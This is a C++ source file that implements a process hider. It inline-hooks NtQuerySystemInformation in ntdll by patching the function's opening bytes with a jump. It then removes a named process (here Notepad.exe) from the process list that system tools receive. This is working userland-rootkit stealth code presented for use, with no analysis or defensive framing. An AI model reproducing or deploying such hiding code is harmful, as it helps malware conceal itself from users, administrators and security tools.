#define _CRT_SECURE_NO_WARNINGS

#include <array>
#include <chrono>
#include <cstring>
#include <ctime>
#include <iostream>
#include <string>
#include <thread>
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "processhider.h"

#define PROCESS_NAME L"Notepad.exe"

typedef NTSTATUS(NTAPI* ntquerysysteminformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG Returnlength
    );

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE InheritedFromProcessId;
}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;

ntquerysysteminformation NtQuerySystemInformationOrigAddr;
LPVOID orig_byes;

DWORD ChangeMemoryPermissions(void* const address, const size_t size, const DWORD protections) {
    DWORD oldProtections{};
    BOOL result = VirtualProtect(address, size, protections, &oldProtections);
    if (!result) {
        std::cout << "error in VirtualProtect" << std::endl;
    }
    return oldProtections;
}

void RewriteOriginalBytes(void* const targetAddress, LPVOID orig_bytes) {
    const auto oldProtections = ChangeMemoryPermissions(targetAddress, 25, PAGE_EXECUTE_READWRITE);
    memcpy_s(targetAddress, 25, orig_byes, 25);
}

std::array<unsigned char, 12> CreateInlineHookBytes(const void* const destinationAddress) {
    std::array<unsigned char, 12> jumpBytes { {
            0x48, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
                0xFF, 0xE0
        } };

    size_t address = reinterpret_cast<size_t>(destinationAddress);
    std::memcpy(&jumpBytes[2], &address, sizeof(void*));

    return jumpBytes;
}

void* SaveBytes(void* const targetAddress, const size_t size) {
    LPVOID originalBytes = VirtualAlloc(nullptr, size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!originalBytes)
    {
        std::cout << "Failed in VirtualAlloc" << std::endl;
    }

    std::memcpy(originalBytes, targetAddress, size);

    return originalBytes;
}

void InstallInlineHook(void* const targetAddress, const void* hookAddress) {
    orig_byes = SaveBytes(targetAddress, 25);

    std::array<unsigned char, 12> hookBytes = CreateInlineHookBytes(hookAddress);

    DWORD oldProtections = ChangeMemoryPermissions(targetAddress, hookBytes.size(), PAGE_EXECUTE_READWRITE);

    std::memcpy(targetAddress, hookBytes.data(), hookBytes.size());

    ChangeMemoryPermissions(targetAddress, hookBytes.size(), oldProtections);

    FlushInstructionCache(GetCurrentProcess(), nullptr, 0);
}

int WINAPI HookNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    RewriteOriginalBytes(NtQuerySystemInformationOrigAddr, orig_byes);

    if (SystemInformationClass == SystemProcessInformation) {
        NTSTATUS status = NtQuerySystemInformationOrigAddr(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        if (!NT_SUCCESS(status)) {
            InstallInlineHook(NtQuerySystemInformationOrigAddr, &HookNtQuerySystemInformation);
            return status;
        }

        PSYSTEM_PROCESS_INFO prev = PSYSTEM_PROCESS_INFO(SystemInformation);
        PSYSTEM_PROCESS_INFO curr = PSYSTEM_PROCESS_INFO(SystemInformation);
        while (curr) {
            if (curr->NextEntryOffset == 0) {
                break;
            }

            if (!lstrcmp(curr->ImageName.Buffer, PROCESS_NAME)) { // make search none case sensitive
                printf("%ws\n", curr->ImageName.Buffer);
                prev->NextEntryOffset = curr->NextEntryOffset + prev->NextEntryOffset;
            }

            prev = curr;
            curr = (PSYSTEM_PROCESS_INFO)((BYTE*)curr + curr->NextEntryOffset);
        }
    }

    InstallInlineHook(NtQuerySystemInformationOrigAddr, &HookNtQuerySystemInformation);

    return 0;
}

FARPROC GetFuncAddr(LPCSTR dll, LPCSTR func_name, bool is_module_loaded)
{
    HMODULE hmod;
    if (is_module_loaded)
    {
        hmod = GetModuleHandleA(dll);
    }
    else
    {
        hmod = LoadLibraryA(dll);
    }
    return GetProcAddress(hmod, func_name);
}

void init_hider() {
    NtQuerySystemInformationOrigAddr = (ntquerysysteminformation)GetFuncAddr("ntdll.dll", "NtQuerySystemInformation", true);
    InstallInlineHook(NtQuerySystemInformationOrigAddr, &HookNtQuerySystemInformation);
}


